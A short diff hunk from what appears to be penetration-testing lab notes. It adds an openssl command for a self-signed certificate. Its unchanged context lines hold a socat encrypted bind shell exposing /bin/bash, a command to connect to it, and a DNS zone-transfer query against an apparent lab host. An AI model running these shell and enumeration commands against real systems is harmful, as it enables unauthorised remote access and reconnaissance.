@@ -124,6 +124,9 @@ cat bind_shell.key bind_shell.crt > bind_shell.pem
 sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
 socat - OPENSSL:10.11.0.4:443,verify=0
 
+OPENSSL SELF-SIGNED
+openssl req  -nodes -new -x509  -keyout server.key -out server.cert
+
 DNS
 dig axfr @10.129.146.152 friendzone.red
 
